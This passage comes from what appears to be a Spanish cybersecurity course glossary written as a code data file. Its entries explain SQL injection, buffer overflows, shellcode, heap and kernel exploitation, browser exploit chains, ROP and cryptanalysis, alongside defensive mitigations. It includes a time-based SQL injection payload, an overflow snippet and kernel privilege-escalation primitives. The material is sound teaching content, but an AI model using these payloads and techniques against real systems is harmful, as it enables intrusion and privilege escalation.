      "• **Time-based** — se fuerza un retardo y se mide el tiempo de respuesta.\n" +
      "' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0) -- \n" +
      "> 💡 Es lento (bit a bit), por eso se automatiza, pero entender la lógica es clave.",
    examples: [
      "Inferir la versión de la BD carácter a carácter por tiempo.",
      "Un blind booleano que revela datos por diferencias en la página.",
    ],
    related: ["SQL Injection manual", "SQL Injection", "Herramientas: sqlmap"],
  },
  {
    id: 573,
    module: 54,
    term: "Database hardening",
    short: "Endurecer la base de datos para limitar el daño aunque haya inyección.",
    detail:
      "Defensa en capas para bases de datos:\n" +
      "• **Consultas parametrizadas** — la cura raíz del SQLi.\n" +
      "• **Mínimo privilegio** — la cuenta de la app no debe ser admin de la BD.\n" +
      "• **Cifrado** en reposo y en tránsito; **segmentar** la BD en red privada.\n" +
      "• **Auditoría** de accesos y consultas anómalas.\n" +
      "> 💡 Con mínimo privilegio, un SQLi exitoso causa mucho menos daño.",
    examples: [
      "La app conecta con un usuario que solo puede SELECT/INSERT lo necesario.",
      "Base de datos en subred privada, sin exposición a Internet.",
    ],
    related: ["Prevención de inyección", "Principio de mínimo privilegio", "DMZ y segmentación de red"],
  },

  // ── M55 · C/C++ y Low-Level Security ─────────────────────────────────────
  {
    id: 580,
    module: 55,
    term: "Fundamentos de C",
    short: "El lenguaje de los sistemas: potente, cercano al hardware y sin red de seguridad.",
    detail:
      "**C** es la base de SOs, drivers y software de bajo nivel. Da control directo de la memoria mediante **punteros**, pero **no protege** contra accesos inválidos: ahí nacen las vulnerabilidades de memoria (overflows, use-after-free) que dominan el exploiting.\n" +
      "> 💡 Leer C es imprescindible para auditar software de sistemas y entender exploits.",
    examples: [
      "Un puntero que accede fuera de los límites de un array.",
      "Auditar código C en busca de funciones inseguras (strcpy, gets).",
    ],
    related: ["Gestión de memoria", "Buffer overflow", "Shellcode básico"],
  },
  {
    id: 581,
    module: 55,
    term: "Gestión de memoria",
    short: "Stack y heap: dónde viven los datos y por qué importa para la seguridad.",
    detail:
      "La memoria de un proceso se divide en regiones; las dos clave para el exploiting:\n" +
      "| Región | Contiene |\n" +
      "|---|---|\n" +
      "| Stack | Variables locales, dirección de retorno |\n" +
      "| Heap | Memoria dinámica (malloc/free) |\n" +
      "En C **tú gestionas** la memoria: errores como liberar dos veces (double free), usar tras liberar (**use-after-free**) o escribir de más (**overflow**) son explotables.\n" +
      "> ⚠️ La dirección de retorno guardada en el stack es el objetivo clásico de un buffer overflow.",
    examples: [
      "Un use-after-free al usar un puntero ya liberado.",
      "Una variable local desbordada que pisa la dirección de retorno.",
    ],
    related: ["Fundamentos de C", "Buffer overflow", "Shellcode básico"],
  },
  {
    id: 582,
    module: 55,
    term: "Buffer overflow",
    short: "Escribir más datos de los que cabe en un buffer corrompe la memoria adyacente.",
    detail:
      "Un **buffer overflow** ocurre cuando se escriben **más bytes de los que el buffer admite**, sobrescribiendo memoria contigua. En el stack, eso puede pisar la **dirección de retorno** y **redirigir la ejecución** al código del atacante.\n" +
      "char buf[64]; strcpy(buf, input); // si input > 64 → overflow\n" +
      "> 💡 Mitigaciones modernas: **stack canary**, **ASLR**, **DEP/NX**. Ver el diagrama 'Anatomía de un buffer overflow'.",
    examples: [
      "strcpy de una entrada larga que sobrescribe el saved EIP.",
      "Un gets() clásico explotable en un binario de CTF.",
    ],
    related: ["Gestión de memoria", "Shellcode básico", "Exploit y Payload"],
  },
  {
    id: 583,
    module: 55,
    term: "Shellcode básico",
    short: "El código máquina que se ejecuta tras tomar control del flujo de un programa.",
    detail:
      "El **shellcode** es un pequeño bloque de **código máquina** (a menudo lanza una shell, `/bin/sh`) que se inyecta y se ejecuta al **redirigir la ejecución** con un overflow. Debe ser **independiente de posición** y a veces evitar **bytes nulos**. `msfvenom` o `pwntools` lo generan.\n" +
      "> ⚠️ Con DEP/NX el stack no es ejecutable, así que el shellcode directo se sustituye por **ROP**.",
    examples: [
      "Un shellcode execve('/bin/sh') inyectado tras el overflow.",
      "Generar shellcode con pwntools para un exploit.",
    ],
    related: ["Buffer overflow", "Gestión de memoria", "msfvenom"],
  },

  // ── M56 · Go para Security Tools ─────────────────────────────────────────
  {
    id: 590,
    module: 56,
    term: "Fundamentos de Go",
    short: "Compilado, multiplataforma y de binario único: ideal para herramientas portables.",
    detail:
      "**Go** compila a un **binario único sin dependencias**, multiplataforma (cross-compile trivial) y rápido. Por eso es el lenguaje preferido para **herramientas ofensivas modernas** que deben correr en cualquier host sin instalar nada.\n" +
      "> 💡 Un `GOOS=windows go build` produce un .exe portable desde Linux.",
    examples: [
      "Compilar una herramienta para Windows, Linux y macOS de una vez.",
      "Un implante de un solo binario sin runtime que instalar.",
    ],
    related: ["Concurrencia y goroutines", "Network tools en Go", "Túneles con chisel y ligolo"],
  },
  {
    id: 591,
    module: 56,
    term: "Concurrencia y goroutines",
    short: "Las goroutines hacen trivial la concurrencia masiva: escaneos ultrarrápidos.",
    detail:
      "Las **goroutines** son hilos ligerísimos: lanzar miles es barato. Combinadas con **canales**, hacen que Go destaque en tareas **concurrentes** como escanear miles de puertos/hosts en paralelo a gran velocidad.\n" +
      "go scan(host, port) // lanza una goroutine\n" +
      "> 💡 Por esto muchos escáneres modernos (httpx, naabu) están en Go.",
    examples: [
      "Un port scanner concurrente que barre /16 en segundos.",
      "Procesar miles de URLs en paralelo con un pool de workers.",
    ],
    related: ["Fundamentos de Go", "Network tools en Go", "Tipos de escaneo Nmap"],
  },
  {
    id: 592,
    module: 56,
    term: "Network tools en Go",
    short: "La librería estándar de red de Go es robusta y suficiente para casi todo.",
    detail:
      "La **stdlib** de Go (`net`, `net/http`, `crypto/tls`) cubre TCP/UDP, HTTP y TLS sin dependencias externas. Eso, con la concurrencia y el binario único, hace de Go la base de muchas herramientas de recon y red de la comunidad (proyectos de ProjectDiscovery).",
    examples: [
      "Un cliente HTTP concurrente para fuzzing de directorios.",
      "Un pequeño proxy/redirector escrito con net.",
    ],
    related: ["Concurrencia y goroutines", "Túneles con chisel y ligolo", "Fundamentos de Go"],
  },
  {
    id: 593,
    module: 56,
    term: "Por qué Go en tooling (chisel/ligolo)",
    short: "Binario portable + concurrencia explica por qué el tooling de pivoting moderno es Go.",
    detail:
      "Herramientas de **pivoting** como **chisel** y **ligolo-ng** están en Go precisamente por sus ventajas: un **binario único** que se sube a la víctima sin dependencias, **cross-compilation** para cualquier objetivo y **concurrencia** para manejar múltiples túneles. Es el sweet spot del tooling ofensivo actual.",
    examples: [
      "Subir el binario Go de chisel a un host Windows comprometido.",
      "ligolo-ng (Go) creando una interfaz hacia la red interna.",
    ],
    related: ["Network tools en Go", "Túneles con chisel y ligolo", "Fundamentos de Go"],
  },

  // ── M57 · Ruby y Metasploit Development ──────────────────────────────────
  {
    id: 600,
    module: 57,
    term: "Fundamentos de Ruby",
    short: "El lenguaje de Metasploit: dinámico, expresivo y orientado a objetos.",
    detail:
      "**Ruby** es el lenguaje en el que está escrito **Metasploit Framework**. Es dinámico y muy expresivo, lo que facilita escribir y modificar **módulos** del framework. Saber Ruby es lo que permite ir más allá de *usar* Metasploit a **extenderlo**.",
    examples: [
      "Modificar un módulo existente de MSF para un caso propio.",
      "Entender el código de un exploit de Metasploit.",
    ],
    related: ["Estructura de un módulo MSF", "Exploits custom en MSF", "Arquitectura de Metasploit"],
  },
  {
    id: 601,
    module: 57,
    term: "Estructura de un módulo MSF",
    short: "Cada módulo de Metasploit sigue una plantilla: metadatos, opciones y la lógica.",
    detail:
      "Un **módulo MSF** es una clase Ruby con partes bien definidas: `initialize` (**metadatos**: nombre, autor, referencias), `register_options` (RHOSTS, RPORT…), y el método principal (`exploit` o `run`). Heredar de la clase adecuada da gratis todo el plumbing del framework.\n" +
      "> 💡 Ver el diagrama 'Estructura de un módulo de Metasploit' con el flujo de desarrollo.",
    examples: [
      "Un módulo auxiliary con register_options y run.",
      "Un exploit que define check y exploit.",
    ],
    related: ["Fundamentos de Ruby", "Exploits custom en MSF", "Auxiliares y post-explotación"],
  },
  {
    id: 602,
    module: 57,
    term: "Exploits custom en MSF",
    short: "Escribir un exploit propio dentro del framework para reutilizar payloads y handlers.",
    detail:
      "Desarrollar un **exploit custom** en MSF aprovecha toda la maquinaria: catálogo de **payloads**, **encoders**, manejo de sesiones y **handlers** automáticos. En vez de un PoC suelto, se obtiene un exploit integrado, con `check` para verificar vulnerabilidad y `targets` para distintas versiones.",
    examples: [
      "Portar un PoC de un overflow a un módulo exploit de MSF.",
      "Definir varios targets con offsets distintos por versión.",
    ],
    related: ["Estructura de un módulo MSF", "Payloads y Meterpreter", "Buffer overflow"],
  },
  {
    id: 603,
    module: 57,
    term: "Auxiliares y post-explotación",
    short: "No todo es explotar: módulos auxiliary (escaneo/fuzzing) y post (tras el acceso).",
    detail:
      "Además de exploits, MSF tiene:\n" +
      "• **Auxiliary** — escáneres, fuzzers, brute forcers (sin payload).\n" +
      "• **Post** — módulos que corren **tras** obtener una sesión: recolectar credenciales, pivotar, persistencia.\n" +
      "Saber escribirlos automatiza fases enteras de un engagement.",
    examples: [
      "Un módulo auxiliary de brute force SSH.",
      "Un módulo post que vuelca hashes de la máquina comprometida.",
    ],
    related: ["Estructura de un módulo MSF", "Post-explotación", "Exploits custom en MSF"],
  },

  // ── M58 · HTML/CSS y Seguridad Frontend ──────────────────────────────────
  {
    id: 610,
    module: 58,
    term: "Estructura HTML",
    short: "El esqueleto de toda página web: entenderlo es la base del análisis frontend.",
    detail:
      "**HTML** define la estructura de la página con etiquetas y atributos. Conocerla permite **inspeccionar** una web (DevTools), entender cómo se inyecta un XSS (qué contexto: atributo, etiqueta, script) y reconocer elementos sospechosos (iframes ocultos, formularios que apuntan fuera).",
    examples: [
      "Inspeccionar el DOM con las DevTools del navegador.",
      "Detectar un iframe invisible usado para clickjacking.",
    ],
    related: ["Formularios e inputs", "Detección de páginas de phishing", "Fundamentos de JavaScript"],
  },
  {
    id: 611,
    module: 58,
    term: "Formularios e inputs",
    short: "Los formularios son la principal vía de entrada de datos — y de ataques.",
    detail:
      "Los **`<form>`** e **`<input>`** recogen datos del usuario y son la puerta de la mayoría de los ataques web (inyección, XSS, CSRF). El atributo **`action`** indica adónde van los datos: si apunta a un dominio externo, es señal de phishing/exfiltración.",
    examples: [
      "Un formulario de login cuyo action apunta a otro dominio.",
      "Inputs sin restricción que permiten inyectar payloads.",
    ],
    related: ["Estructura HTML", "Validación client-side y sus límites", "Cross-Site Request Forgery (CSRF)"],
  },
  {
    id: 612,
    module: 58,
    term: "Validación client-side y sus límites",
    short: "La validación en el navegador mejora la UX, pero el atacante la salta a voluntad.",
    detail:
      "La **validación del lado del cliente** (HTML5 `required`, JS) es **solo para la experiencia de usuario**: el atacante controla su navegador y puede **saltársela** (editar el DOM, mandar la petición directa con Burp/curl).\n" +
      "> ⚠️ Regla de oro: **toda validación se repite en el servidor**. El cliente nunca es de confianza.",
    examples: [
      "Quitar el atributo 'maxlength' por DevTools y enviar más datos.",
      "Mandar la petición con curl saltándose la validación JS.",
    ],
    related: ["Formularios e inputs", "Prevención de inyección", "Node.js security"],
  },
  {
    id: 613,
    module: 58,
    term: "Detección de páginas de phishing",
    short: "Reconocer las señales en el HTML/CSS de un sitio que suplanta a otro.",
    detail:
      "Analizar el frontend de un sitio sospechoso revela el phishing: **formularios** que envían a un dominio distinto, **recursos** (logos, CSS) cargados del sitio legítimo, dominios **lookalike**, y JS que captura credenciales. Es útil para triage de URLs reportadas.\n" +
      "> 💡 Un kit de phishing suele clonar el HTML de la víctima pero cambiar el `action` del formulario.",
    examples: [
      "Un clon de un portal bancario con el action apuntando al atacante.",
      "CSS y logos cargados directamente del banco real (hotlinking).",
    ],
    related: ["Estructura HTML", "Formularios e inputs", "Evasión de filtros"],
  },

  // ── M59 · Heap Exploitation ──────────────────────────────────────────────
  {
    id: 620,
    module: 59,
    term: "El heap de glibc",
    short: "La memoria dinámica se gestiona en 'chunks' agrupados en listas (bins) para reusarlos.",
    detail:
      "El **heap** sirve la memoria dinámica (`malloc`/`free`). glibc la organiza en **chunks** (con cabeceras de tamaño y flags) y, al liberarlos, los guarda en listas llamadas **bins** para reutilizarlos. Entender esa estructura es lo que permite **corromperla** de forma controlada.\n" +
      "> 💡 La metadata de los chunks vive *junto* a los datos: por eso un overflow de heap puede pisar punteros de gestión.",
    examples: [
      "Un overflow que sobrescribe el campo size del chunk siguiente.",
      "Inspeccionar el heap con el comando 'heap' de pwndbg/gef.",
    ],
    related: ["tcache y fastbin", "Use-after-free y double free", "Gestión de memoria"],
  },
  {
    id: 621,
    module: 59,
    term: "tcache y fastbin",
    short: "Listas rápidas de chunks libres, simples de envenenar para lograr escritura arbitraria.",
    detail:
      "**tcache** (per-thread) y **fastbin** son listas enlazadas simples de chunks pequeños liberados, pensadas para velocidad — con pocas comprobaciones. El **tcache poisoning** sobrescribe el puntero `next` de un chunk libre para que el siguiente `malloc` devuelva una **dirección elegida** por el atacante.\n" +
      "> 💡 El tcache poisoning es hoy la primitiva de heap más usada por su simplicidad.",
    examples: [
      "Envenenar el tcache para que malloc devuelva un puntero a __free_hook.",
      "Un double free en fastbin para duplicar un chunk.",
    ],
    related: ["El heap de glibc", "Use-after-free y double free", "Técnicas 'House of'"],
  },
  {
    id: 622,
    module: 59,
    term: "Use-after-free y double free",
    short: "Usar o liberar memoria ya liberada corrompe el heap de forma explotable.",
    detail:
      "• **Use-after-free (UAF)** — se sigue usando un puntero a memoria ya liberada; si el atacante reocupa ese chunk, controla los datos (o una vtable).\n" +
      "• **Double free** — liberar dos veces el mismo chunk corrompe los bins y permite reasignaciones solapadas.\n" +
      "> ⚠️ Ambos son la base de la mayoría de los exploits de heap modernos (navegadores, kernel).",
    examples: [
      "Un UAF en un objeto C++ que permite secuestrar su vtable.",
      "Un double free que habilita tcache poisoning.",
    ],
    related: ["tcache y fastbin", "El heap de glibc", "Vulnerabilidades de kernel"],
  },
  {
    id: 623,
    module: 59,
    term: "Técnicas 'House of'",
    short: "Familia de ataques clásicos al asignador para lograr escritura arbitraria.",
    detail:
      "Las técnicas **'House of …'** (Force, Spirit, Orange, Einherjar) abusan de la lógica del asignador de glibc para conseguir una **escritura casi arbitraria** o solapar chunks. Cada una explota una parte distinta (el top chunk, el unsorted bin, etc.) y va cambiando según evoluciona glibc.\n" +
      "> 💡 'House of Orange' encadena un overflow del top chunk con el flujo de `_IO_FILE` para ejecución de código.",
    examples: [
      "House of Force para extender el top chunk a una dirección objetivo.",
      "House of Orange combinando heap y file streams.",
    ],
    related: ["El heap de glibc", "tcache y fastbin"],
  },

  // ── M60 · Kernel Exploitation ────────────────────────────────────────────
  {
    id: 630,
    module: 60,
    term: "Kernel vs user space",
    short: "El kernel corre con privilegio total; explotarlo da control absoluto de la máquina.",
    detail:
      "El SO separa el **user space** (apps, sin privilegios) del **kernel space** (privilegio total, ring 0). Un exploit de kernel parte de un proceso sin privilegios y, abusando de un fallo en el kernel o un driver, **escala a root/SYSTEM** o ejecuta código en ring 0.\n" +
      "> ⚠️ Un bug de kernel suele significar compromiso **total** del sistema, saltándose toda contención de user space.",
    examples: [
      "Escalar de usuario normal a root vía un driver vulnerable.",
      "Un syscall que valida mal un puntero de user space.",
    ],
    related: ["Vulnerabilidades de kernel", "Primitivas de escalada", "Mitigaciones de kernel"],
  },
  {
    id: 631,
    module: 60,
    term: "Vulnerabilidades de kernel",
    short: "UAF, out-of-bounds y race conditions en el kernel y sus drivers.",
    detail:
      "Las clases más comunes: **use-after-free**, **out-of-bounds** (lectura/escritura), **race conditions** (TOCTOU) y confusión de tipos, a menudo en **drivers** y subsistemas (la mayor superficie). Un fallo de validación de un puntero de user space en un `ioctl` es un clásico.\n" +
      "> 💡 La mayoría de los 0-days de kernel viven en drivers de terceros, no en el core.",
    examples: [
      "Un UAF en un driver gráfico explotable desde una app.",
      "Una race condition que gana una ventana para escribir fuera de límites.",
    ],
    related: ["Kernel vs user space", "Primitivas de escalada", "Use-after-free y double free"],
  },
  {
    id: 632,
    module: 60,
    term: "Primitivas de escalada",
    short: "Objetivos clásicos en memoria de kernel que convierten un bug en root.",
    detail:
      "Tras lograr una escritura en kernel, se apunta a **primitivas** conocidas:\n" +
      "• **`modprobe_path`** — sobrescribir esta cadena para ejecutar un binario propio como root.\n" +
      "• **struct `cred`** — poner `uid=0` en las credenciales del proceso actual.\n" +
      "• **`commit_creds(prepare_kernel_cred(0))`** — el patrón clásico para volverse root.\n" +
      "> 💡 Estas primitivas convierten una escritura limitada en una escalada completa y fiable.",
    examples: [
      "Sobrescribir modprobe_path a /tmp/x para ejecutar como root.",
      "Parchear el struct cred del proceso para uid 0.",
    ],
    related: ["Vulnerabilidades de kernel", "Kernel vs user space", "Mitigaciones de kernel"],
  },
  {
    id: 633,
    module: 60,
    term: "Mitigaciones de kernel",
    short: "SMEP, SMAP, KASLR y KPTI dificultan la explotación de kernel.",
    detail:
      "El kernel moderno se defiende con varias mitigaciones:\n" +
      "| Mitigación | Qué impide |\n" +
      "|---|---|\n" +
      "| SMEP | Ejecutar código de user space en kernel |\n" +
      "| SMAP | Acceder a datos de user space desde kernel |\n" +
      "| KASLR | Direcciones de kernel predecibles |\n" +
      "| KPTI | Fuga de direcciones (Meltdown) |\n" +
      "El bypass suele requerir un **leak** (contra KASLR) y **ROP en kernel** (contra SMEP).",
    examples: [
      "Un infoleak de kernel para derrotar KASLR.",
      "ROP en kernel para sortear SMEP.",
    ],
    related: ["Primitivas de escalada"],
  },

  // ── M61 · Browser Exploitation ───────────────────────────────────────────
  {
    id: 640,
    module: 61,
    term: "Arquitectura del navegador y motor JS",
    short: "Multiproceso y sandbox: el renderer no confía en sí mismo, por eso hace falta una full chain.",
    detail:
      "Los navegadores son **multiproceso**: el **renderer** (que ejecuta JS y HTML no confiables) corre en un **sandbox** aislado del resto. El **motor JS** (V8, JavaScriptCore) incluye un **JIT** que compila JS a código máquina — superficie compleja y rica en bugs.\n" +
      "> 💡 Por el sandbox, comprometer el renderer **no** es suficiente: hace falta un segundo bug para escapar (full chain).",
    examples: [
      "El renderer de Chrome aislado por sitio (site isolation).",
      "El JIT optimizando una función caliente a código nativo.",
    ],
    related: ["Vulnerabilidades del motor JS", "Primitivas de explotación", "Sandbox escape y full chain"],
  },
  {
    id: 641,
    module: 61,
    term: "Vulnerabilidades del motor JS",
    short: "Type confusion y bugs del JIT son la vía clásica de entrada en un navegador.",
    detail:
      "Las vulnerabilidades estrella del motor JS:\n" +
      "• **Type confusion** — el motor trata un objeto como de un tipo que no es, leyendo/escribiendo fuera de su forma real.\n" +
      "• **Bugs del JIT** — el compilador asume invariantes incorrectas (ej. eliminación errónea de bounds checks).\n" +
      "> 💡 Un bug de type confusion suele dar directamente una primitiva de lectura/escritura relativa muy potente.",
    examples: [
      "Un JIT que elimina un bounds check necesario por un side effect.",
      "Type confusion entre dos clases con layout distinto.",
    ],
    related: ["Arquitectura del navegador y motor JS", "Primitivas de explotación", "Use-after-free y double free"],
  },
  {
    id: 642,
    module: 61,
    term: "Primitivas de explotación",
    short: "addrof/fakeobj y la lectura/escritura arbitraria: los ladrillos del exploit de navegador.",
    detail:
      "Desde un bug se construyen **primitivas**:\n" +
      "• **addrof** — obtener la dirección de un objeto JS.\n" +
      "• **fakeobj** — fabricar un objeto falso en una dirección elegida.\n" +
      "Combinadas dan **lectura/escritura arbitraria** en el espacio del renderer, con la que se sobrescribe un puntero de función o se hace ejecutable un buffer con el shellcode.\n" +
      "> 💡 'addrof + fakeobj → R/W arbitrario → RCE' es el esqueleto de casi todo exploit de motor JS.",
    examples: [
      "Construir R/W arbitrario a partir de un type confusion.",
      "Sobrescribir el puntero de una función JIT-compileada con shellcode.",
    ],
    related: ["Vulnerabilidades del motor JS", "Sandbox escape y full chain", "Shellcode básico"],
  },
  {
    id: 643,
    module: 61,
    term: "Sandbox escape y full chain",
    short: "Encadenar el bug del renderer con otro para salir del sandbox hasta el sistema.",
    detail:
      "Lograr ejecución en el renderer no basta: está en un **sandbox**. La **full chain** encadena ese primer bug con un **segundo** (en el proceso broker, el kernel o un driver) para **escapar** y obtener ejecución con privilegios del sistema. Las cadenas reales (ej. de los Pwn2Own) combinan 2-3 bugs.\n" +
      "> ⚠️ Por eso un solo bug de navegador rara vez es 'crítico' por sí mismo sin el escape.",
    examples: [
      "Renderer RCE + bug de kernel para SYSTEM (cadena de Pwn2Own).",
      "Escapar vía una IPC mal validada al proceso broker.",
    ],
    related: ["Primitivas de explotación", "Arquitectura del navegador y motor JS", "Kernel vs user space"],
  },

  // ── M62 · ROP/JOP Avanzado y Bypass de Mitigaciones ──────────────────────
  {
    id: 650,
    module: 62,
    term: "Code-reuse attacks",
    short: "Si no puedes inyectar código, reutiliza el que ya existe en el binario.",
    detail:
      "Con **DEP/NX** el stack/heap no son ejecutables, así que el shellcode inyectado no corre. La respuesta son los **code-reuse attacks**: en vez de inyectar código, se **reutiliza** el ya presente (el binario, libc) encadenando fragmentos para lograr el efecto deseado. ROP y JOP son sus formas principales.\n" +
      "> 💡 ROP nació justamente como respuesta a DEP: no necesita ejecutar memoria 'nueva'.",
    examples: [
      "ret2libc llamando a system('/bin/sh') sin shellcode propio.",
      "Reusar gadgets del binario para preparar una syscall.",
    ],
    related: ["JOP y automatización", "Buffer overflow"],
  },
  {
    id: 651,
    module: 62,
    term: "Construcción de cadenas ROP",
    short: "Encadenar 'gadgets' (trozos que terminan en ret) para ejecutar lógica arbitraria.",
    detail:
      "Un **gadget** es una secuencia corta de instrucciones que termina en `ret` (ej. `pop rdi; ret`). Encadenando gadgets en el stack se controlan registros y se invocan funciones/**syscalls** — una mini-máquina virtual hecha de pedazos del binario.\n" +
      "pop rdi; ret    ; carga el 1er argumento\n" +
      "> 💡 Objetivo típico: llamar a `mprotect` para volver ejecutable una región y saltar al shellcode, o a `system`.",
    examples: [
      "Una cadena que pone los argumentos y llama a execve.",
      "ROP a mprotect(addr, len, RWX) y luego al shellcode.",
    ],
    related: ["Code-reuse attacks", "JOP y automatización", "CFI e Intel CET"],
  },
  {
    id: 652,
    module: 62,
    term: "JOP y automatización",
    short: "Variante basada en saltos (no en ret) y herramientas para hallar gadgets.",
    detail:
      "El **JOP** (*Jump-Oriented Programming*) encadena gadgets que terminan en **saltos** (`jmp`) en vez de `ret`, evadiendo defensas centradas solo en `ret`. Encontrar gadgets a mano es inviable, así que se usan herramientas: **ROPgadget**, **ropper**, **angrop**.\n" +
      "ROPgadget --binary ./vuln | grep 'pop rdi'",
    examples: [
      "Usar ropper para listar gadgets útiles del binario.",
      "JOP cuando una mitigación vigila el flujo de los ret.",
    ],
    related: ["Construcción de cadenas ROP", "Code-reuse attacks", "CFI e Intel CET"],
  },
  {
    id: 653,
    module: 62,
    term: "CFI e Intel CET",
    short: "Mitigaciones que protegen el flujo de control para frenar ROP/JOP.",
    detail:
      "Las defensas modernas atacan la raíz del code-reuse:\n" +
      "• **CFI** (*Control-Flow Integrity*) — valida que los saltos/llamadas indirectas van a destinos legítimos.\n" +
      "• **Intel CET** — **shadow stack** (detecta retornos manipulados) + **IBT** (limita destinos de saltos indirectos).\n" +
      "> ⚠️ No son perfectas: hay bypass (gadgets 'CFI-válidos', ataques a datos), pero suben mucho el coste del exploit.",
    examples: [
      "Una shadow stack que detecta el ROP al retornar a un gadget.",
      "CFI que bloquea una llamada indirecta a un gadget arbitrario.",
    ],
    related: ["Construcción de cadenas ROP", "JOP y automatización"],
  },

  // ── M63 · Criptoanálisis ─────────────────────────────────────────────────
  {
    id: 660,
    module: 63,
    term: "Modelos de ataque criptográfico",
    short: "Se clasifican por cuánto puede el atacante: del solo-cifrado al texto-claro elegido.",
    detail:
      "La fortaleza de un cifrado se mide contra atacantes de **poder creciente**:\n" +
      "| Modelo | El atacante tiene |\n" +
      "|---|---|\n" +
      "| Ciphertext-only (COA) | Solo textos cifrados |\n" +
      "| Known-plaintext (KPA) | Pares claro/cifrado |\n" +
      "| Chosen-plaintext (CPA) | Puede cifrar lo que elija |\n" +
      "| Chosen-ciphertext (CCA) | Puede descifrar lo que elija |\n" +
      "> 💡 Un cifrado serio debe resistir el modelo más fuerte (**IND-CCA**); ver el diagrama de modelos de ataque.",
    examples: [
      "WEP cayó en gran parte por ataques de tipo known-plaintext.",
      "Un padding oracle es un ataque de tipo chosen-ciphertext.",
    ],
    related: ["Criptoanálisis diferencial y lineal", "Ataques a implementaciones", "Modos de operación"],
  },
  {
    id: 661,
    module: 63,
    term: "Criptoanálisis diferencial y lineal",
    short: "Las dos técnicas clásicas para atacar cifrados de bloque por sus sesgos estadísticos.",
    detail:
      "• **Diferencial** — estudia cómo **diferencias** en la entrada se propagan a la salida; si ciertas diferencias son más probables, se filtra información de la clave.\n" +
      "• **Lineal** — busca **aproximaciones lineales** entre bits de entrada, salida y clave que se cumplen con sesgo.\n" +
      "> 💡 DES fue diseñado (sin decirlo) resistente al diferencial; AES se diseñó explícitamente robusto contra ambos.",
    examples: [
      "Atacar un cifrado con pocas rondas mediante criptoanálisis diferencial.",
      "Medir el sesgo lineal de una S-box débil.",
    ],
    related: ["Modelos de ataque criptográfico", "AES vs DES/3DES", "Ataques a implementaciones"],
  },
  {
    id: 662,
    module: 63,
    term: "Side-channel attacks",
    short: "Atacar la implementación física, no las matemáticas: tiempo, consumo, caché.",
    detail:
      "Un **canal lateral** filtra información por **cómo se ejecuta** el algoritmo, no por su diseño:\n" +
      "• **Timing** — el tiempo de cómputo depende de bits de la clave.\n" +
      "• **Power/EM** — el consumo eléctrico revela operaciones (DPA).\n" +
      "• **Cache** — accesos a memoria dependientes de la clave (Flush+Reload).\n" +
      "> ⚠️ Mitigación: implementaciones **constant-time** (sin ramas ni accesos dependientes del secreto).",
    examples: [
      "Recuperar una clave RSA midiendo tiempos de descifrado.",
      "Un ataque de caché contra una tabla de AES no protegida.",
    ],
    related: ["Ataques a implementaciones", "Modelos de ataque criptográfico"],
  },
  {
    id: 663,
    module: 63,
    term: "Ataques a implementaciones",
    short: "El algoritmo es sólido pero su uso/implementación filtra el secreto (padding oracle).",
    detail:
      "Muchos ataques reales no rompen el cifrado sino su **implementación**: el **padding oracle** (la app revela si el padding es válido) permite descifrar CBC byte a byte; **Bleichenbacher** ataca el padding de RSA PKCS#1. La lección: los **detalles** (padding, manejo de errores, nonces) son tan críticos como el algoritmo.\n" +
      "> 💡 Usar AEAD (AES-GCM) y librerías probadas evita la mayoría de estos errores.",
    examples: [
      "Un padding oracle que descifra una cookie cifrada en CBC.",
      "Bleichenbacher (ROBOT) contra TLS mal implementado.",
    ],
    related: ["Side-channel attacks", "Modos de operación", "Modelos de ataque criptográfico"],
  },

  // ── M64 · Criptografía Post-Cuántica ─────────────────────────────────────
  {
    id: 670,
    module: 64,
    term: "Amenaza cuántica",
    short: "Shor rompe RSA/ECC; Grover solo debilita la cripto simétrica (mitigable subiendo claves).",
    detail:
      "Dos algoritmos cuánticos preocupan:\n" +
      "• **Shor** — factoriza y resuelve el logaritmo discreto en tiempo polinómico → **rompe RSA, ECC y Diffie-Hellman**.\n" +
      "• **Grover** — acelera la búsqueda (raíz cuadrada) → **debilita** la simétrica, pero basta **duplicar** la clave (AES-256) para neutralizarlo.\n" +
      "> ⚠️ El riesgo **'harvest now, decrypt later'**: capturar tráfico cifrado hoy para descifrarlo cuando exista el ordenador cuántico.",
    examples: [
      "RSA-2048 sería trivial para un ordenador cuántico grande.",
      "AES-256 se considera 'quantum-safe' (Grover solo lo lleva a ~128 bits).",
    ],
    related: ["Familias de criptografía post-cuántica", "Estándares NIST PQC", "Amenaza cuántica y post-quantum"],
  },
  {
    id: 671,
    module: 64,
    term: "Familias de criptografía post-cuántica",
    short: "Esquemas basados en problemas que ni un cuántico resuelve fácil: retículos, hash, códigos.",
    detail:
      "La **PQC** se apoya en problemas matemáticos resistentes a lo cuántico:\n" +
      "| Familia | Base | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| Retículos (lattice) | Problemas en retículos | Kyber, Dilithium |\n" +
      "| Basada en hash | Seguridad de funciones hash | SPHINCS+ |\n" +
      "| Basada en códigos | Códigos correctores | Classic McEliece |\n" +
      "| Isogenias | Curvas elípticas isógenas | (SIKE, roto en 2022) |\n" +
      "> 💡 Los **retículos** dominan por su buen equilibrio tamaño/velocidad.",
    examples: [
      "Kyber (retículos) para intercambio de claves post-cuántico.",
      "SPHINCS+ (hash) como firma conservadora.",
    ],
    related: ["Amenaza cuántica", "Estándares NIST PQC", "Migración y cripto-agilidad"],
  },
  {
    id: 672,
    module: 64,
    term: "Estándares NIST PQC",
    short: "Los algoritmos post-cuánticos ya estandarizados tras años de competición pública.",
    detail:
      "Tras una competición abierta (2016-2024), el **NIST** estandarizó los primeros algoritmos PQC en 2024:\n" +
      "• **ML-KEM** (antes Kyber) — encapsulado de claves.\n" +
      "• **ML-DSA** (antes Dilithium) y **SLH-DSA** (SPHINCS+) — firmas.\n" +
      "Son la base recomendada para la transición.\n" +
      "> 💡 La caída de **SIKE** (2022) durante el proceso recordó que la PQC aún es joven; por eso se despliega en **modo híbrido** (clásico + PQC).",
    examples: [
      "Adoptar ML-KEM en TLS de forma híbrida con X25519.",
      "Firmar con ML-DSA en sistemas que deben durar décadas.",
    ],
    related: ["Familias de criptografía post-cuántica", "Migración y cripto-agilidad", "Amenaza cuántica"],
  },
  {
    id: 673,
    module: 64,
    term: "Migración y cripto-agilidad",
    short: "Cambiar de algoritmo no es trivial: hay que diseñar sistemas que puedan rotarlo.",
    detail:
